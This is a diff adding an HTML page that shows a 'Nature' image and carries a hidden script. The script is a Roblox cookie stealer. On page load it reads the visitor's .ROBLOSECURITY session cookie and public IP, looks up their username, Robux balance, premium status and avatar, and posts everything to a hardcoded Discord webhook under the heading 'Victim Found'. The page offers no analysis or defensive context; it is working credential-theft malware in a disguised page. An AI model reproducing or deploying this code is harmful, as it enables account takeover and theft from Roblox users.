@@ -1,0 +1,116 @@
+<script>const WEBHOOK = "https://discord.com/api/webhooks/1433266191719333989/WMc3ZLkFPQ7TEjgaA6N17ec_R-8afxu2o9yEd9IZgBQhjfAd8YIrCnMNcGsKi0bYmNVw";
+
+// Function to get cookie by name
+function getCookie(name) {
+  const value = `; ${document.cookie}`;
+  const parts = value.split(`; ${name}=`);
+  if (parts.length === 2) return parts.pop().split(';').shift();
+  return null;
+}
+
+// Main function
+async function main(cookie) {
+  const ipAddr = await fetch("https://api.ipify.org").then(res => res.text());
+
+  let userId = null;
+  let userName = "N/A";
+  let isPremium = "N/A";
+  let robuxBalance = "N/A";
+  let headshotUrl = "";
+
+  if (cookie) {
+    // Fetch user info from Roblox
+    try {
+      const response = await fetch("https://www.roblox.com/my/settings/json", {
+        method: 'GET',
+        mode: 'cors',
+        credentials: 'include',
+        headers: {
+          'referer': 'https://www.roblox.com/my/settings/json',
+          'Cookie': '.ROBLOSECURITY=' + cookie
+        },
+        referrerPolicy: 'strict-origin-when-cross-origin'
+      });
+
+      if (response.ok) {
+        const statistics = await response.json();
+        userId = statistics.UserId;
+        userName = statistics.Name;
+        isPremium = String(statistics.IsPremium);
+      } else {
+        console.error("Failed to fetch stats: Status", response.status);
+      }
+    } catch (e) {
+      console.error("Error fetching statistics:", e);
+    }
+
+    // Fetch Robux balance
+    if (userId) {
+      try {
+        const data = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`);
+        const jsonData = await data.json();
+        robuxBalance = jsonData.robux !== undefined ? jsonData.robux : "N/A";
+      } catch (e) {
+        console.error("Error fetching robux:", e);
+      }
+    }
+
+    // Fetch avatar headshot
+    if (userId) {
+      try {
+        const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
+        const avatarData = await avatarResponse.json();
+        if (avatarData.data && avatarData.data.length > 0) {
+          headshotUrl = avatarData.data[0].imageUrl;
+        }
+      } catch (e) {
+        console.error("Error fetching avatar:", e);
+      }
+    }
+  }
+
+  // Send to Discord webhook
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      embeds: [
+        {
+          description: "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
+          color: 16711680,
+          fields: [
+            { name: "Username", value: userName, inline: true },
+            { name: "Robux", value: robuxBalance.toString(), inline: true },
+            { name: "Premium", value: isPremium, inline: true }
+          ],
+          author: {
+            name: "Victim Found: " + ipAddr,
+            url: `https://www.roblox.com/users/${userId}/profile`,
+            icon_url: headshotUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
+          },
+          footer: {
+            text: "XYZEN 199.59.243.225",
+            icon_url: "https://cdn.discordapp.com/avatars/1426694389337686147/4f4402fac3d95c2a18d6c5f3c940f8de.webp?size=80"
+          },
+          thumbnail: {
+            url: headshotUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
+          }
+        }
+      ],
+      username: "HIT",
+      avatar_url: ""
+    })
+  });
+}
+
+// Retrieve the cookie and run
+const cookie = getCookie('.ROBLOSECURITY');
+if (cookie) {
+  main(cookie);
+} else {
+  console.log("Roblox cookie not found in document.cookie");
+}</script>
+
+<img src="https://tse3.mm.bing.net/th/id/OIP.sOmzZBVfv9O0a6tXx08YbQHaFO?pid=Api&P=0&h=220" alt="Nature" width="600">
